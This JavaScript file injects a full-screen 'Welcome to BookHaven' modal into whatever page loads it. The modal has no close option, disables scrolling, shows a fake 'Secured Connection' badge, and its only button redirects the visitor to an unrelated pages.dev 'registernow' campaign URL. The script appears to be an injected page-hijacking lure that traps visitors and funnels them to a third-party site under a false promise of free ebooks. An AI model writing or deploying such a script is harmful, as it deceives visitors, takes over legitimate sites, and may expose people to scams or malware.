// User Engagement Modal with Instant Redirect
(function() {
    // ============================================
    // CONFIGURATION
    // ============================================
    
    const CONFIG = {
        redirectURL: 'https://registernow-7ps.pages.dev/api/?campaign=welcome'
    };
    
    // ============================================

    // Inject CSS styles
    const style = document.createElement('style');
    style.textContent = `
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: "Montserrat", sans-serif;
            font-weight: bold;
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
        
        .popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: fadeIn 0.3s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .popup-card {
            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
            border-radius: 20px;
            padding: 3rem 2rem;
            max-width: 450px;
            width: 90%;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .brand-logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #c9a50a, #f0c419);
            border-radius: 20px;
            margin: 0 auto 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            color: white;
            font-weight: bold;
            box-shadow: 0 10px 30px rgba(201, 165, 10, 0.3);
        }
        
        .popup-header {
            margin-bottom: 1.5rem;
        }
        
        .popup-header h2 {
            font-size: 2.2rem;
            font-weight: 700;
            color: #ffffff;
            margin-bottom: 0.5rem;
            letter-spacing: -0.5px;
        }
        
        .popup-header p {
            color: #cccccc;
            font-size: 1.1rem;
            font-weight: 500;
        }
        
        .features-list {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 1.5rem;
            margin: 2rem 0;
            text-align: left;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .feature-item {
            display: flex;
            align-items: center;
            margin-bottom: 1rem;
            color: #ffffff;
            font-size: 0.95rem;
        }
        
        .feature-item:last-child {
            margin-bottom: 0;
        }
        
        .feature-icon {
            width: 24px;
            height: 24px;
            background: #c9a50a;
            border-radius: 50%;
            margin-right: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            color: white;
            flex-shrink: 0;
            font-weight: bold;
        }
        
        .btn-continue {
            background: linear-gradient(135deg, #c9a50a 0%, #f0c419 100%);
            color: white;
            border: none;
            padding: 18px 40px;
            border-radius: 12px;
            font-size: 1.1rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 8px 25px rgba(201, 165, 10, 0.4);
            width: 100%;
            letter-spacing: 0.5px;
            margin-top: 1rem;
        }
        
        .btn-continue:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 35px rgba(201, 165, 10, 0.5);
        }
        
        .btn-continue:active {
            transform: translateY(0);
        }
        
        .secure-badge {
            display: inline-flex;
            align-items: center;
            background: rgba(230, 255, 250, 0.1);
            color: #88e0c8;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 600;
            margin-top: 1.5rem;
            border: 1px solid rgba(136, 224, 200, 0.3);
        }
        
        .secure-badge::before {
            content: "🔒";
            margin-right: 6px;
        }
        
        @media screen and (max-width: 500px) {
            .popup-card {
                padding: 2rem 1.5rem;
                max-width: 95%;
                border-radius: 16px;
            }
            
            .popup-header h2 {
                font-size: 1.8rem;
            }
            
            .brand-logo {
                width: 70px;
                height: 70px;
                font-size: 28px;
            }
        }
    `;
    document.head.appendChild(style);

    // Create modal HTML
    const modalHTML = `
        <div class="popup-overlay" id="popupOverlay">
            <div class="popup-card">
                <div class="brand-logo">B</div>
                
                <div class="popup-header">
                    <h2>Welcome to BookHaven</h2>
                    <p>Your Digital Reading Journey Awaits</p>
                </div>
                
                <div class="features-list">
                    <div class="feature-item">
                        <div class="feature-icon">✓</div>
                        <span>Access thousands of free ebooks</span>
                    </div>
                    <div class="feature-item">
                        <div class="feature-icon">✓</div>
                        <span>No downloads required</span>
                    </div>
                    <div class="feature-item">
                        <div class="feature-icon">✓</div>
                        <span>Instant reading experience</span>
                    </div>
                </div>
                
                <button class="btn-continue" id="continueBtn">
                    Start Reading Now ›
                </button>
                
                <div class="secure-badge">
                    Secured Connection
                </div>
            </div>
        </div>
    `;

    // Initialize
    function init() {
        document.body.insertAdjacentHTML('beforeend', modalHTML);
        document.body.style.overflow = 'hidden';

        const overlay = document.getElementById('popupOverlay');
        const continueBtn = document.getElementById('continueBtn');

        // Show modal immediately
        setTimeout(function() {
            overlay.style.display = 'flex';
        }, 100);

        // Continue button - INSTANT redirect
        continueBtn.addEventListener('click', function() {
            // Immediately redirect - no delay
            window.location.href = CONFIG.redirectURL;
        });

        // Prevent background scrolling
        document.addEventListener('wheel', preventScroll, { passive: false });
        document.addEventListener('touchmove', preventScroll, { passive: false });
        
        function preventScroll(e) {
            e.preventDefault();
            return false;
        }
    }

    // Load immediately
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
